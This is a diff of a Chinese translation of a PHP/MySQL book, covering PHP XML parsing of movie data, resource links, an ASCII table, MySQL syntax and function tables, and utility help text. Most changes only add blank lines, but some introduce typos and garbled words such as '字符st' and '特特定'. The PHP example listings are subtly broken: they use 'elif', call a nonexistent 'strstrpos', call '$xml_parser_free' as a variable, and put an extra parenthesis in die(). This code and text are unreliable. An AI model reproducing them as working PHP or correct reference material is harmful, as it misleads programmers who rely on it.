+
 <ACTOR>
+
 <FN>Jack</FN>
+
 <LN>White</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Karen</FN>
+
 <LN>Harris</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Laura</FN>
+
 <LN>Martin</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Mary</FN>
+
 <LN>Jackson</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Oscar</FN>
+
 <LN>Lee</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Quinn</FN>
+
 <LN>Thompson</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Rose</FN>
+
 <LN>Garcia</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Steven</FN>
+
 <LN>Martinez</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Vera</FN>
+
 <LN>Rodriguez</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Xavier</FN>
+
 <LN>Lopez</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Yara</FN>
+
 <LN>Hernandez</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Zane</FN>
+
 <LN>Wilson</LN>
+
 </ACTOR>
+
 </ACTORS>
+
 </MOVIE>
+
 </W4F_DOC>
+
 ```
 
 ## 与 XML 解析器工作
@@ -11474,21 +13231,33 @@ YEAR CDATA #IMPLIED>
 你编译到 PHP 中的 XML 解析器（见第 2 章）使用回调函数来处理元素。当解析器找到信息块（如标签、属性、字符数据）时，会调用你指定的特定函数。例如，下面的代码告诉 XML 解析器在找到开始标签（`<author>`）或结束标签（`</author>`）时调用哪些函数。
 
 ```php
+
 xml_set_element_handler(
+
   $xml_parser,
+
   ".startElement",
+
   ".endElement");
+
 ```
 
 `startElement` 函数可能像这样：
 
 ```php
+
 function startElement($parser, $name, $attrs) {
+
   echo "$name<br>";
+
   while (list($key, $value) = each($attrs)) {
+
     echo "--key: $key>$value</b><br>";
+
   }
+
 }
+
 ```
 
 `$name` 参数持有标签的名称。而 `$attrs` 参数是一个持有该标签任何属性的数组。
@@ -11496,8 +13265,11 @@ function startElement($parser, $name, $attrs) {
 `endElement` 函数可以简单为：
 
 ```php
+
 function endElement($parser, $name) {
+
 }
+
 ```
 
 当然，这些函数并没有做什么。列表 17.2 显示了一个完整的程序，它可以同时显示起始 XML 标签和数据。`$depth` 值跟踪嵌套情况，以便在每个标签名称之前显示正确数量的连字符。显示连字符显示了数据的缩进（因此显示了结构）。实际数据值（如电影名称）为粗体字体。
@@ -11505,21 +13277,31 @@ function endElement($parser, $name) {
 **列表 17.2** 解析 XML 标签、属性和字符数据
 
 ```php
+
 <?php // xml101.php
+
 // 返回一个包含整个文件的字符串。
+
 function read_file_into_buffer($filename) {
+
   $ary_lines = file($filename);
+
   $contents = "";
 
   while (list($key, $value) = each($ary_lines)) {
+
     $contents .= $value;
+
   }
 
   return($contents);
+
 }
 
 // 这个函数每个每个开始 XML 标签调用一次。
+
 function startElement($parser, $name, $attrs) {
+
 ```
 
 
@@ -11529,86 +13311,141 @@ function startElement($parser, $name, $attrs) {
 # 获取电影信息
 
 ```php
+
 global $depth;
 
 $spacer = '';
+
 for ($i = 0; $i < $depth[$parser]; $i++) {
+
     $spacer .= '--';
+
 }
+
 print "$spacer<name><br>";
+
 ```
 
 ```php
+
 while (list($key, $value) = each($attrs)) {
+
     echo "$spacer...$key. <b>$value</b><br><br>";
+
 }
+
 ```
 
 ```php
+
 $depth[$parser]++;
+
 }
+
 ```
 
 ```php
+
 // 此函数为每个结束的
+
 // XML 标签调用一次。
+
 function endElement($parser, $name) {
+
     global $depth;
 
 $depth[$parser]--;
+
 }
+
 ```
 
 ```php
+
 // 此函数在处理标签包含
+
 // 数据时被调用。当看到空白字符时
+
 //也会调用它，这就是为什么在没有剩余字符时
+
 // 会数据进行修剪并忽略。
+
 function characterData($parser, $data) {
+
     $data = trim($data);
+
     if (strlen($data)) {
+
         print "<b>$data</b><br>";
+
     }
+
 ```
 
 ```php
+
 // 构建要获取的 URL。你可以使用
+
 // 本地系统的文件。例如，你
+
 // 可以 $url = '/usr/local/xml/harvey.xml';
+
 $host = 'http://db.cis.upenn.edu/cgi-bin/serveXML?';
+
 $service = 'SERVICE=IMDB';
+
 $target = 'URL-http://us.imdb.com/Title?00425456';
+
 $url = $host . $service . '&' . $target;
+
 ```
 
 ```php
+
 $data = read_file_into_buffer($url);
+
 echo '<html><title>XML01</title></head><body>';
+
 ```
 
 ```php
+
 // 创建解析器。变量 $xml_parser 
+
 // 根据需要传递给其他 xml 函数。
+
 $xml_parser = xml_parser_create();
 
 // 告诉解析器哪些函数处理起始
+
 // 和结束标签。
+
 xml_set_element_handler($xml_parser, "startElement",
+
 "endElement");
+
 xml_set_character_data_handler($xml_parser,
+
 "characterData");
 
 // 开始解析。
+
 if (!xml_parse($xml_parser, $data, 1)) {
+
     die(sprintf("XML error: %s at line %d",
+
     xml_error_string(xml_get_error_code($xml_parser)),
+
     xml_get_current_line_number($xml_parser))));
+
 }
 
 // 销毁解析器。
+
 xml_parser_free($xml_parser);
 
 echo '</body></html>';
+
 ```
 
 此程序显示：
@@ -11655,25 +13492,41 @@ Wolfe
 现在是时候处理得更具体了；PHP 脚本需要“知道”它正在解析电影信息。由于信息是一次获取一部电影的，这一点很重要。信息的结构也很重要：
 
 ```xml
+
 <W4F_DOC>
+
  <MOVIE TITLE="Harvey" YEAR="1950">
+
  <CATEGORIES>
+
   <GENRE>Comedy</GENRE>
+
  </CATEGORIES>
+
  <ACTORS>
+
   <ACTOR>
+
    <FN>James</FN>
+
    <LN>Stewart</LN>
+
   </ACTOR>
+
  </ACTORS>
+
 </MOVIE>
+
 </W4F_DOC>
+
 ```
 
 每部电影仅有一个标题和一个年份。你可以看到电影标题可能被引用为：
 
 ```
+
 W4F_DOC^MOVIE^TITLE
+
 ```
 
 注意：脱字符符（^）被用作分隔符，因为它很少（如果的话）作为标签或属性名称的一部分使用。
@@ -11681,7 +13534,9 @@ W4F_DOC^MOVIE^TITLE
 类似地，演员的姓可能是：
 
 ```
+
 W4F_DOC^MOVIE^ACTORS^ACTOR^LN
+
 ```
 
 这种字符串（以脱字符符作为分隔符的列表中的标签名）可以被称为结构键（structure key），因为结构键中的每个名称对应于 XML 层级结构（结构）中的不同级别。
@@ -11696,72 +13551,117 @@ W4F_DOC^MOVIE^ACTORS^ACTOR^LN
 ##  17.3 从 XML 设置 PHP 变量
 
 ```php
+
 <?php
+
 // 返回包含整个文件的字符串
+
 function read_file_into_buffer($filename) {
+
     $ary_lines = file($filename);
+
     $contents = "";
+
     while (list($key, $value) = each($ary_lines)) {
+
         $contents .= $value;
+
     }
+
     return($contents);
+
 }
 
 function startElement($parser, $name, $attrs) {
+
     global $lst_current_tag;
+
     global $movie_title;
+
     global $movie_year;
 
     // 将当前标签名添加到 $lst_current_tag 列表中。
+
     $lst_current_tag .= "$name";
 
     while (list($key, $value) = each($attrs)) {
+
         // 如果当前标签是 movie，则检查属性。
+
         if ($lst_current_tag == "W4F_DOC^MOVIE") {
+
             if ($key == "TITLE") {
+
                 $movie_title = $value;
+
             } elseif ($key == "YEAR") {
+
                 $movie_year = $value;
+
             }
+
         }
+
     }
+
 }
 
 function endElement($parser, $name) {
+
     global $lst_current_tag;
 
     // 在变量中找到最后一个脱字符的位置。
+
     $caret_pos = strstrpos($lst_current_tag, '^');
 
-    // 从列表中移除最后一个元素。
+    // 从列列表中移除最后一个元素。
+
     $lst_current_tag = substr($lst_current_tag, 0, $caret_pos);
+
 }
 
 function characterData($parser, $data) {
+
     global $lst_current_tag;
+
     global $first_name;
+
     global $movie_actors;
 
     $data = trim($data);
+
     // 这里是我们感兴趣的结构键。
+
     $skey_fn = "W4F_DOC^MOVIE^ACTORS^FN";
+
     $skey_ln = "W4F_DOC^MOVIE^ACTORS^LN";
 
     // 将名字存储到全局变量中供以后。
+
     if ($lst_current_tag == $skey_fn) {
+
         $first_name = $data;
+
     }
 
     // 如果正在处理姓，将姓名添加到演员数组。
+
     elif ($lst_current_tag == $skey_ln) {
+
         $movie_actors[] = $first_name . $data;
+
         $first_name = '';
+
     }
+
 }
 
 $host = 'http://db.cis.upenn.edu/cgi-bin/serveXML?';
+
 $service = 'SERVICE=IMDB';
+
 $target = 'URL-http://us.imdb.com/title?00425456';
+
 $url = $host . $service . '&' . $target;
 
 $data = read_file_into_buffer($url);
@@ -11769,26 +13669,39 @@ $data = read_file_into_buffer($url);
 echo '<html><head><title>XML01</title></head><body>';
 
 $lst_current_tag = '';
+
 $xml_parser = xml_parser_create();
 
 xml_set_character_data_handler($xml_parser, "characterData");
+
 xml_set_element_handler($xml_parser, "startElement", "endElement");
 
 if (!xml_parse($xml_parser, $data, 1)) {
+
     die(sprintf("XML error: %s at line %d",
+
     xml_error_string(xml_get_error_code($xml_parser)),
+
     xml_get_current_line_number($xml_parser))));
+
 }
 
 $xml_parser_free($xml_parser);
 
 // 使用逗号作为分隔符将所有数组元素连接成一个字符串。
+
 $first_actors = join($movie_actors, ",");
+
 echo "Movie Title: <b>$movie_title</b><br>";
+
 echo "Movie Year: <b>$movie_year</b><br>";
+
 echo "Actor(s): <b>$first_actors</b><br>";
+
 echo '</body></html>';
+
 ?>
+
 ```
 
 此程序显示：
@@ -11835,7 +13748,7 @@ Actor(s): James Stewart, Joseph Hull, Peg Dow, Cecil Kellary, Victoria Horne, Je
 
 以下网站是建立你的资源库的好地方。此外，这些网站会让你对确切已经存在且你可以使用或修改的内容有一个概念。大量的免费软件（freeware）或共享软件（shareware）让你感到惊讶。
 
-如果你是刚开始学习 PHP 编程，请访问本章列出的每一个网站。通过这样做可以让你很好地了解有哪些可以帮助你成为优秀程序员的资源。在访问网站时，请记录你感兴趣的可以下载的有用文件，包括它们的版本和日期。你可能
+如果你是刚开始学习 PHP 编程，请访本章列出的每一个网站。通过这样做可以让你很好地了解有哪些可以帮助你成为优秀程序员的资源。在访问网站时，请记录你感兴趣的可以下载的有用文件，包括它们的版本和日期。你可能
 
 # 附录 A
 
@@ -11846,7 +13759,9 @@ Actor(s): James Stewart, Joseph Hull, Peg Dow, Cecil Kellary, Victoria Horne, Je
 # PHP: 超文本预处理器
 
 ```
+
 http://www.php.net/
+
 ```
 
 这是 PHP 的主页。在这里你可以找到新闻、文档以及可以下载的最新版本。
@@ -11854,7 +13769,9 @@ http://www.php.net/
 # MySQL
 
 ```
+
 http://www.tcx.se/
+
 ```
 
 这是 MySQL 的主页。在这里你可以找到新闻、文档以及可以下载的最新版本。你可以找到该站的许多镜像，包括 http://www.buoy.com/mysql。
@@ -11862,7 +13779,9 @@ http://www.tcx.se/
 # PHPBuilder.com
 
 ```
+
 http://www.phpbuilder.com/
+
 ```
 
 紧邻 PHP 主页，这个网站对于新 PHP 程序员来说最有价值。它的价值在于有很多可供阅读的文章。这些文章包括“通过示例学习使用正则表达式”、“安装 Apache”以及“使用 PHP 创建图像”。
@@ -11870,6 +13789,7 @@ http://www.phpbuilder.com/
 # phpwizard.net
 
 ```
+
 http://www.htmlwizard.net/
 ```
 
@@ -11909,6 +13829,7 @@ http://php.codebase.org/content/default/index.html
 # FishCartSQL
 
 ```
+
 http://www.fishcart.org/
 ```
 
@@ -11917,6 +13838,7 @@ http://www.fishcart.org/
 # VH Consultants
 
 ```
+
 http://www.consultants.com/
 ```
 
@@ -11925,6 +13847,7 @@ http://www.consultants.com/
 # phpwizard
 
 ```
+
 http://www.phpwizard.net/
 ```
 
@@ -11933,6 +13856,7 @@ http://www.phpwizard.net/
 # PHP 文档
 
 ```
+
 http://www.php.net/
 ```
 
@@ -11941,14 +13865,12 @@ http://www.php.net/
 # MySQL 文档
 
 ```
+
 http://www.tcx.se/
-```
+
+
 
 这是 MySQL 的主页。在这里你可以找到新闻、文档以及可以下载的最新版本。你可以找到该站的许多镜像，包括 http://www.buoy.com/mysql。
-
-
-
-
 
 # Freshmeat
 
@@ -12062,7 +13984,7 @@ http://www-library.itsi.disa.mil/org/std_src.html
 
 # 表 B.1 ASCII 表（续）
 
-| 十进制 | 十六进制 | 二进制 | ASCII 字符 |
+| 十进制 | 十六进制 | 二进位 | ASCII 字符 |
 |---|---|---|---|
 | 046 | 0x2e | 0010 1110 | . |
 | 047 | 0x2f | 0010 1111 | / |
@@ -12159,7 +14081,7 @@ http://www-library.itsi.disa.mil/org/std_src.html
 | 121 | 0x79 | 0111 1001 | y |
 | 122 | 0x7a | 0111 1010 | z |
 | 123 | 0x7b | 0111 1011 | { |
-| 124 | 0x7c | 0111 1100 | | |
+| 124 | 0x7c | 0111 1100 | \| |
 | 125 | 0x7d | 0111 1101 | } |
 | 126 | 0x7e | 0111 1110 | ~ |
 | 127 | 0x7f | 0111 1111 | |
@@ -12196,11 +14118,11 @@ http://www-library.itsi.disa.mil/org/std_src.html
 | 153 | 0x99 | 1001 1001 | |
 | 154 | 0x9a | 1001 1010 | |
 | 155 | 0x9b | 1001 1011 | |
-| 156 | 0x9c | 1001 1100 | | |
-| 157 | 0x9d | 1001 1101 | | |
-| 158 | 0x9e | 1001 1110 | | |
-| 159 | 0x9f | 1001 1111 | | |
-| 160 | 0xa0 | 1010 0000 | | |
+| 156 | 0x9c | 1001 1100 | |
+| 157 | 0x9d | 1001 1101 | |
+| 158 | 0x9e | 1001 1110 | |
+| 159 | 0x9f | 1001 1111 | |
+| 160 | 0xa0 | 1010 0000 | |
 | 161 | 0xa1 | 1010 0001 | i |
 | 162 | 0xa2 | 1010 0010 | ¢ |
 | 163 | 0xa3 | 1010 0011 | £ |
@@ -12209,34 +14131,30 @@ http://www-library.itsi.disa.mil/org/std_src.html
 
 | 十进制 | 十六进制 | 二进制 | ASCII 字符 |
 |---|---|---|---|
-| 140 | 0x8c | 1000 1100 | | |
-| 141 | 0x8d | 1000 1101 | | |
-| 142 | 0x8e | 1000 1110 | | |
-| 143 | 0x8f | 1000 1111 | | |
-| 144 | 0x90 | 1001 0000 | | |
-| 145 | 0x91 | 1001 0001 | | |
-| 146 | 0x92 | 1001 0010 | | |
-| 147 | 0x93 | 1001 0011 | | |
-| 148 | 0x94 | 1001 0100 | | |
-| 149 | 0x95 | 1001 0101 | | |
-| 150 | 0x96 | 1001 0110 | | |
-| 151 | 0x97 | 1001 0111 | | |
-| 152 | 0x98 | 1001 1000 | | |
-| 153 | 0x99 | 1001 1001 | | |
-| 154 | 0x9a | 1001 1010 | | |
-| 155 | 0x9b | 1001 1011 | | |
-| 156 | 0x9c | 1001 1100 | | |
-| 157 | 0x9d | 1001 1101 | | |
-| 158 | 0x9e | 1001 1110 | | |
-| 159 | 0x9f | 1001 1111 | | |
-| 160 | 0xa0 | 1010 0000 | | |
+| 140 | 0x8c | 1000 1100 | |
+| 141 | 0x8d | 1000 1101 | |
+| 142 | 0x8e | 1000 1110 | |
+| 143 | 0x8f | 1000 1111 | |
+| 144 | 0x90 | 1001 0000 | |
+| 145 | 0x91 | 1001 0001 | |
+| 146 | 0x92 | 1001 0010 | |
+| 147 | 0x93 | 1001 0011 | |
+| 148 | 0x94 | 1001 0100 | |
+| 149 | 0x95 | 1001 0101 | |
+| 150 | 0x96 | 1001 0110 | |
+| 151 | 0x97 | 1001 0111 | |
+| 152 | 0x98 | 1001 1000 | |
+| 153 | 0x99 | 1001 1001 | |
+| 154 | 0x9a | 1001 1010 | |
+| 155 | 0x9b | 1001 1011 | |
+| 156 | 0x9c | 1001 1100 | |
+| 157 | 0x9d | 1001 1101 | |
+| 158 | 0x9e | 1001 1110 | |
+| 159 | 0x9f | 1001 1111 | |
+| 160 | 0xa0 | 1010 0000 | |
 | 161 | 0xa1 | 1010 0001 | i |
 | 162 | 0xa2 | 1010 0010 | ¢ |
 | 163 | 0xa3 | 1010 0011 | £ |
-
-
-
-
 
 ## 附录 B
 
@@ -12425,7 +14343,7 @@ EXPLAIN select_options
 
 ## FLUSH
 
-```
+```sql
 FLUSH flush_option [,flush_option]
 ```
 
@@ -12441,12 +14359,17 @@ ON (tbl_name | **, | db_name*) TO user_name [IDENTIFIED BY 'password'] [, user_n
 ```sql
 INSERT [LOW_PRIORITY | DELAYED] [IGNORE]
 [INTO] tbl_name [(col_name,...)]
+
 VALUES (expression,...),(expression...)
+
 or INSERT [LOW_PRIORITY | DELAYED] [IGNORE]
 [INTO] tbl_name [(col_name,...)]
+
 SELECT ...
+
 or INSERT [LOW_PRIORITY | DELAYED] [IGNORE]
 [INTO] tbl_name
+
 SET col_name=expression, col_name=expression, ...
 ```
 
@@ -12461,12 +14384,19 @@ KILL thread_id
 ```sql
 LOAD DATA [LOCAL] INFILE 'file_name.txt' [REPLACE | IGNORE]
 INTO TABLE tbl_name
+
 [FIELDS]
+
 [TERMINATED BY '\t']
+
 [OPTIONALLY] ENCLOSED BY '"']
+
 [ESCAPED BY '\\']
+
 [LINES TERMINATED BY '\n']
+
 [IGNORE number LINES]
+
 [(col_name,...)] )
 ```
 
@@ -12487,10 +14417,8 @@ OPTIMIZE TABLE tbl_name
 ```sql
 REPLACE [LOW_PRIORITY | DELAYED] [IGNORE]
 [INTO] tbl_name [(col_name,...)]
+
 VALUES (expression,...)
-```
-
-
 
 or REPLACE [LOW_PRIORITY | DELAYED]
 [INTO] tbl_name [(col_name,...)]
@@ -12499,40 +14427,46 @@ SELECT ...
 or REPLACE [LOW_PRIORITY | DELAYED]
 [INTO] tbl_name
 SET col_name=expression, col_name=expression,...
-
-# REVOKE 
-
 ```
-REVOKE priv_type [(column_list)] [, priv_type
-[(column_list)] ...]
+
+## REVOKE 
+
+```sql
+REVOKE priv_type [(column_list)] [, priv_type [(column_list)] ...]
 ON tbl_name | * | * | db_name.*)
 FROM user_name [user, user_name ...]
 ```
 
-# SELECT
+## SELECT
 
-```
+```sql
 SELECT [STRAIGHT_JOIN] [SOL_SMALL_RESULT]
 |DISTINCT | DISTINCTROW | ALL]
-```
 
 select_expression,...
 
-```
 [INTO OUTFILE 'file_name' export_options]
+
 [FROM table_references
+
 [WHERE where_definition]
+
 [GROUP BY col_name,...]
+
 [HAVING having where_definition]
+
 [ORDER BY [unsigned_integer | col_name]
+
 [ASC | DESC],...]
+
 [LIMIT [offset,...]] rows]
+
 [PROCEDURE procedure_name ]
 ```
 
 ## 语法:
 
-```
+```sql
 table_reference, table_reference
 table_reference [CROSS] JOIN table_reference
 table_reference STRAIGHT_JOIN table_reference
@@ -12546,13 +14480,13 @@ table_reference
 conditional_expr }
 ```
 
-# SET
+## SET
 
-```
+```sql
 SET [OPTION] SQL_VALUE_OPTION= value, ...
 ```
 
-# 附录 C
+## 附录 C
 
 SHOW
 SHOW DATABASES [LIKE wild]
@@ -12575,7 +14509,7 @@ col_name1=expr1,col_name2=expr2,...
 USE
 USE db_name
 
-# MySQL 运算符
+## MySQL 运算符
 
 与计算机语言一样，MySQL 识别许多运算符。以下列表总结了它们：
 
@@ -12614,7 +14548,7 @@ USE db_name
 | expr1 <=> expr2 | 比较 | 对两个操作数进行 NULL 安全比较。如果你需要使用 NULL 值，请阅读 MySQL 手册的 7.3.5 节。 |
 | expr1 AND expr2 | 位 | 对两个操作数进行 AND 运算。如果两个操作数均为 true，则返回 true。否则返回 false。你可以使用 && 代替 AND。 |
 | expr BETWEEN min AND max | 比较 | 如果 expr 大于 min 且小于 max，则返回 true。 |
-| BINARY expr | 类型 | 将 expr 转换为二进制字符串。 |
+| BINARY expr | 类型 | 将 expr 转换为二进字符串。 |
 | BIT_COUNT(n) | 位 | 返回 n 中的位数。 |
 | expr IN (value_list) | 比较 | 如果 expr 匹配逗号分隔的 value_list 中的任何值，则返回 true。你也可以使用 NOT IN。 |
 | INTERVAL(n, number_list) | 比较 | 返回大于 n 的第 n 个值。数字列表中的每个连续值必须大于前一个值。 |
@@ -12700,11 +14634,6 @@ MySQL 的灵活性来自于许多函数，如下：
 | LEAD(expr) | 窗口函数 | 返回下一个值。 |
 | LAG(expr) | 窗口函数 | 返回上一个值。 |
 
-
-
-
-462
-
 ## 表 C.2 MySQL 函数（续）
 
 | 函数 | 类型 | 描述 |
@@ -12783,7 +14712,7 @@ MySQL 的灵活性来自于许多函数，如下：
 | POWER(expr1, expr2) | 数学 | 返回 expr1 的 expr2 次幂。可以使用 POW 代替 POWER。 |
 | QUARTER(date) | 日期/时间 | 返回日期的季度，范围为 1 到 4。 |
 | RADIANS(expr) | 数学 | 将度转换为弧度。 |
-| RAND([expr]) | 数学 | 返回范围 0 到 1.0 的随机浮点值。如果提供了 expr，则作为种子值。注意：不要在 GROUP BY 字段表达式中使用 RAND。 |
+| RAND([expr]) | 数学 | 返回范围 0 到 1.0 的随机浮点值。如果提供了 expr，则作为种子值。注意：不要在 GROUP BY 字段表式中使用 RAND。 |
 | RELEASE_LOCK(lock_name) | 杂项 | 释放 lock_name 锁。如果成功则返回 true，如果当前进程未创建锁则返回 false，如果锁不存在则返回 NULL。 |
 | REPEAT(expr, count) | 字符串 | 返回重复 count 次的字符串 expr。 |
 | REPLACE(target, string, replacement) | 字符串 | 返回替换了所有 string 实例后的 target。 |
@@ -12804,10 +14733,6 @@ MySQL 的灵活性来自于许多函数，如下：
 | SEC_TO_TIME(seconds) | 日期/时间 | 将秒转换为小时、分钟和秒，格式为 'HH:MM:SS' 或 HMMMMSS，取决于该函数是在字符串还是数值上下文中使用的。参见 TIME_TO_SEC。 |
 | SESSION_USER() | | 参见 USER. |
 
-
-
-
-
 ## 表 C.2 MySQL 函数（续）
 
 | 函数 | 类型 | 描述 |
@@ -12818,7 +14743,7 @@ MySQL 的灵活性来自于许多函数，如下：
 | SPACE(count) | 字符串 | 返回一个由 `count` 个空格字符组成的字符串。 |
 | SQRT(expr) | 数学 | 返回 expr 的非负平方根。 |
 | STDDEV(expr) | 分组 | 用于在 group 中查找 expr 的标准差。可以使用 STD 代替 STDDEV。 |
-| STCMP(expr1, expr2) | 字符串 | 比较两个字符串。如果字符串相同则返回 0，如果第一个较小则返回 -1，如果第二个较小则返回 1。 |
+| STCMP(expr1, expr2) | 字符st | 比较两个字符串。如果字符串相同则返回 0，如果第一个较小则返回 -1，如果第二个较小则返回 1。 |
 | SUBSTRING(expr, pos [ , length]) | 字符串 | 返回 expr 中长度为 `length` 的字符字符串，可选从 pos 开始。 |
 | SUBSTRING(expr FROM length) | 字符串 | 返回 expr 最右侧的 `length` 个字符。此语法源于 ANSI SQL 92。参见 LEFT、MID、RIGHT 和 STRING。 |
 | SUBSTRING_INDEX(expr, delimiter, count) | 字符串 | 返回 expr 中分隔符 delimiter 出现 `count` 次之后的子字符串。如果 count 为负数，则返回最后一个分隔符（从右侧计数）之后的所有内容。 |
@@ -12923,10 +14848,6 @@ Usage: mysql [OPTIONS] [database]
 - -r, --raw 不经转换写入字段。与 --batch 使用。
 - -s, --silent 更安静。
 
-
-
-
-
 - -L, --skip-line-numbers
 在错误信息时不写入行号。
 
@@ -12955,7 +14876,7 @@ Usage: mysql [OPTIONS] [database]
 max_allowed_packet 当前值: 251658241
 net_buffer_length 当前值: 163841
 
-mysql—此 Perl 脚本用于列出用户对特定数据库的权限。
+mysql—此 Perl 脚本用于列出用户对特特定数据库的权限。
 
 ## 列表 C.4 mysqlaccess—help 的编辑结果
 
@@ -13027,8 +14948,8 @@ mysqladmin—此程序用于管理数据库引擎的方面。特别重要的是 
 - -w, --wait[retries] 如果连接断开则等待并重试
 ```
 
+```
 command 是以下一个或多个（命令可以缩写）：
-
 - create databasename 创建新数据库
 - drop databasename 删除数据库
 - extended-status 给出扩展状态消息
@@ -13046,6 +14967,7 @@ command 是以下一个或多个（命令可以缩写）：
 - status 给出来自服务器的状态消息
 - variables 打印可用变量
 - version 从服务器获取版本信息
+```
 
 mysqlbug—此程序创建一个模板，你可以用它报告 MySQL 的 bug。
 mysqldump—此程序通过向 STDOUT  SQL 语句来转储数据库内容。如果你将输出重定向到文件，你将获得数据库的文本版本。通过少量修改，可以将数据移动到任何符合 SQL 标准的数据库。
@@ -13077,6 +14999,7 @@ mysqldump—此程序通过向 STDOUT  SQL 语句来转储数据库内容。如�
 - -v, --verbose 打印关于各个阶段的信息
 - -V, --version 输出版本信息并退出
 - -w, --wait 如果连接断开则等待并重试
+```
 
 注意：如果使用 socket 连接 MySQL 服务器，服务器将打开文件。在其他情况下，客户端将打开文件。使用 SQL 命令 'LOAD DATA INFILE' 进行导入。
 
@@ -13093,6 +15016,7 @@ mysqlimport—此程序从文件中加载数据。
 ```
 
 选项 --set-variable (-o) 的可用变量有：
+
 max_allowed_packet 当前值: 251658241
 net_buffer_length 当前值: 163841
 
@@ -13114,14 +15038,6 @@ mysqlshow—此程序显示 MySQL 正在管理的数据库、表和字段。
 
 用法: ./mysqlshow [OPTIONS] [database [table [field]]]
 
-
-
-
-
-# 482
-
-# 附录 C
-
 ```
 -#. --debug=... 输出调试日志。通常格式为 'd:t:o,filename'
 -C, --compress      在服务器/客户端协议中使用压缩
@@ -13135,12 +15051,17 @@ mysqlshow—此程序显示 MySQL 正在管理的数据库、表和字段。
 ```
 
 如果最后一个参数包含 shell 通配符（`*` 或 `?`），
+
 则只显示与通配符匹配的内容。
+
 如果未给出数据库，则显示所有匹配的数据库。
+
 如果未给出表，则显示该数据库中所有匹配的表。
+
 如果未给出字段，则显示表中的所有匹配的字段和字段类型。
 
 - * perror—此程序为数字错误代码提供简短文本描述。
+
 - * replace—此程序将一个字符串替换为另一个。它被 msql2mysql 程序使用，但你也可以使用它。
 
 # PHP 函数列表
@@ -13249,10 +15170,6 @@ echo "</ul>";
 
 此脚本可以通过访问 http://www.mtolive.com/phpbook/xd/parse.php3?type=html 查看效果。
 
-
-
-
-
 ## 表 D.1 按照字母顺序排列的 PHP 函数（续）
 
 | 函数名 | 分组名称 | 描述 |
@@ -13264,868 +15181,295 @@ echo "</ul>";
 | bcadd | BC | 两个任意精度数字相 |
 | bcomp | BC | 比较两个任意精度数字 |
 | bdiv | BC | 两个任意精度数字相除 |
+
+
+
 | bcmod | BC | 获取任意精度数字的模 |
+
 | bcmul | BC | 两个任意精度数字相乘 |
+
 | bcpow | BC | 计算一个任意精度数字的另一个数字次方 |
+
 | bcscale | BC | 为所有 bc 函数设置默认精度参数 |
+
 | bsqrt | BC | 获取任意精度数的平方根 |
+
 | bcsub | BC | 从一个任意精度数字中减去另一个 |
+
 | bin2hex | STRINGS | 将二进制数据转换为十六进制 |
+
 | bin2dec | MATH | 将二进制转换为十进制 |
+
 | ceil | MATH | 向上舍入分数 |
+
 | chdir | DIR | 切换目录 |
+
 | checkdate | DATETIME | 验证日期/时间 |
+
 | checkdns | NETWORK | 检查对应于给定主机的 DNS 记录 |
+
 | chgrp | FILESYSTEM | 修改文件组 |
+
 | chmod | FILESYSTEM | 修改文件模式 |
+
 | chop | STRINGS | 去除空格 |
 
 ## 表 D.1 按照字母顺序排列的 PHP 函数（续）
 
 | 函数名 | 分组名称 | 描述 |
+
 | :--- | :--- | :--- |
+
 | chown | FILESYSTEM | 修改文件所有者 |
+
 | chr | STRINGS | 返回特定字符 |
+
 | chunk_split | STRINGS | 将字符串分割成较小的块 |
+
 | clearstatcache | FILESYSTEM | 清除文件缓存 |
+
 | closedir | DIR | 关闭目录句柄 |
+
 | fclose | NETWORK | 关闭与系统的连接 |
+
 | connection_aborted | MISC | 如果断开连接则返回 true |
+
 | connection_status | MISC | 返回连接状态 |
+
 | connection_timeout | MISC | 如果超时则返回 true |
+
 | convert_cyrillic_string | STRINGS | 将西里尔字符集转换为另一种 |
+
 | copy | FILESYSTEM | 复制文件 |
+
 | cos | MATH | 余弦 |
+
 | count | ARRAY | 计算变量中的元素数量 |
+
 | cpdf_add_annotation | CPDF | 添加注释 |
+
 | cpdf_add_outline | CPDF | 为当前页添加书签 |
+
 | cpdf_arc | CPDF | 绘制弧 |
+
 | cpdf_begin_text | CPDF | 开始文本段 |
+
 | cpdf_circle | CPDF | 绘制圆 |
+
 | cpdf_clip | CPDF | 裁剪到当前路径 |
+
 | cpdf_close | CPDF | 关闭 pdf 文档 |
+
 | cpdf_closepath | CPDF | 关闭路径 |
+
 | cpdf_closepath_fill_stroke | CPDF | 关闭、填充并描边路径 |
+
 | cpdf_closepath_stroke | CPDF | 关闭路径并沿路径绘制线 |
+
 | cpdf_continue_text | CPDF | 在下一行输出文本 |
+
 | cpdf_curve | CPDF | 绘制曲线 |
 
 ## 表 D.1 按照字母顺序排列的 PHP 函数（续）
 
 | 函数名 | 分组名称 | 描述 |
+
 | :--- | :--- | :--- |
+
 | cpdf_end_text | CPDF | 开始文本段 |
+
 | cpdf_fill | CPDF | 填充当前路径 |
+
 | cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
+
 | cpdf_finalize | CPDF | 结束文档 |
+
 | cpdf_finalize_page | CPDF | 结束页 |
+
 | cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
+
 | cpdf_lineto | CPDF | 绘制线 |
+
 | cpdf_moveto | CPDF | 设置当前点 |
+
 | cpdf_open | CPDF | 打开新的 pdf 文档 |
+
 | cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
+
 | cpdf_page_init | CPDF | 开始新页 |
+
 | cpdf_place_inline_image | CPDF | 在页面上放置图像 |
+
 | cpdf_rect | CPDF | 绘制矩形 |
+
 | cpdf_restore | CPDF | 恢复以前保存的环境 |
+
 | cpdf_rlineto | CPDF | 绘制线 |
+
 | cpdf_rmoveto | CPDF | 设置当前点 |
+
 | cpdf_rotate | CPDF | 设置旋转 |
+
 | cpdf_save | CPDF | 设置当前环境 |
+
 | cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
+
 | cpdf_scale | CPDF | 设置缩放 |
+
 | cpdf_setdash | CPDF | 设置虚线模式 |
+
